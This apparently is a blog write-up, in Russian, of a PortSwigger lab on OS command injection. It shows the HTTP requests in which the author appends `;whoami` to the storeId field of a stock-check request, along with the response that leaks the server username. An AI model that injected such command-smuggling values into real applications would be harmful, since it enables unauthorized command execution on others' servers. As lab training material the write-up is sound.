---
title: "OS command injection, simple case"
date: 2025-06-27
tags: [injection, writeup, web]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/os-command-injection-apprentice/os-command-injection/lab-simple"
classes: wide
---

Эта лабораторная работа содержит уязвимость **OS command injection** в средстве проверки запасов продуктов. Приложение выполняет команду оболочки, содержащую предоставленные пользователем идентификаторы продуктов и магазинов, и возвращает необработанные выходные данные команды в своем ответе. Для решения лабораторной работы нужно выполнить команду `whoami`, чтобы определить имя текущего пользователя.

```
https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net
```

## Solution

Я вижу страницу с товарами. Попробую открыть страницу с одним из них:

![IMG](/assets/images/IMG_os_command_injection/IMG_OS_command_injection_simple_case/1.png){: height="200" .align-center}

Вижу, что в `URL` через `GET`-запрос с параметром `productId` получается страница товара. Попробую передать команду через него:

```
https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net/product?productId=1&whoami — никаких изменений
https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net/product?productId=1;whoami — ошибка
https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net/product?productId=1|whoami — ошибка
```

Так, нужно поискать другие варианты. Внизу есть кнопка `Check stock`. Она тоже отправляет запрос, попробую через нее:

![IMG](/assets/images/IMG_os_command_injection/IMG_OS_command_injection_simple_case/2.png){: height="200" .align-center}

Происходит это с помощью такого запроса:

```http
POST /product/stock HTTP/2
Host: 0a5b00a603434fb1819a20f7006900d6.web-security-academy.net
Cookie: session=LIlt9TToGmKZCdczt0P9x8a1VqWoAOb2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net/product?productId=1&whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=1&storeId=1
```

Заменю значение аргумента `storeId` на `1;whoami`:

```http
POST /product/stock HTTP/2
Host: 0a5b00a603434fb1819a20f7006900d6.web-security-academy.net
Cookie: session=LIlt9TToGmKZCdczt0P9x8a1VqWoAOb2
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net/product?productId=1&whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0a5b00a603434fb1819a20f7006900d6.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=1&storeId=1;whoami
```

Получил следующий ответ:

```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

62
peter-nYdkXe
```

`peter-nYdkXe` — это имя пользователя, а значит лаба решена.
